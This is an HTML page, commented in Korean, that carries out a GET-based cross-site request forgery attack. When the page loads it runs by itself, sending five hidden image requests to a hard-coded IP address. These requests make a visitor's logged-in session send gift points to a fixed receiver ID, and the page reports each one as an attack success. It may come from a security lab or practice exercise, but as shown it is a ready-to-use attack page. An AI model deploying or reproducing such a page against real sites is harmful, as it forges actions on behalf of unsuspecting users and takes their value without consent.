<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🎯 GET 방식 CSRF</title>
</head>
<body>
    <h1>🚀 GET 기반 CSRF 공격</h1>
    <div id="status">공격 준비 중...</div>
    
    <script>
        let attackCount = 0;
        
        function getAttack(giftType, points, message, delay) {
            setTimeout(() => {
                // GET 방식 이미지 공격
                const img = new Image();
                img.src = `http://3.36.66.216/profile.php?send_gift=1&receiver_id=13&gift_type=${giftType}&points=${points}&message=${message}&gift_to=13&_=${Date.now()}`;
                
                img.onload = () => console.log(`✅ ${giftType} 공격 성공`);
                img.onerror = () => console.log(`⚠️ ${giftType} 공격 시도됨 (에러 정상)`);
                
                attackCount++;
                document.getElementById('status').innerHTML = `🚀 공격 ${attackCount}: ${giftType} (${points}P) 전송 완료!`;
                
            }, delay);
        }
        
        // 페이지 로드 시 자동 실행
        window.onload = function() {
            console.log('🎯 GET 방식 CSRF 공격 시작');
            
            getAttack('coffee', 100, 'get공격1', 1000);
            getAttack('flower', 150, 'get공격2', 3000);  
            getAttack('cake', 200, 'get공격3', 5000);
            getAttack('diamond', 250, 'get공격4', 7000);
            getAttack('coffee', 300, 'get공격5', 9000);
        };
    </script>
</body>
</html>
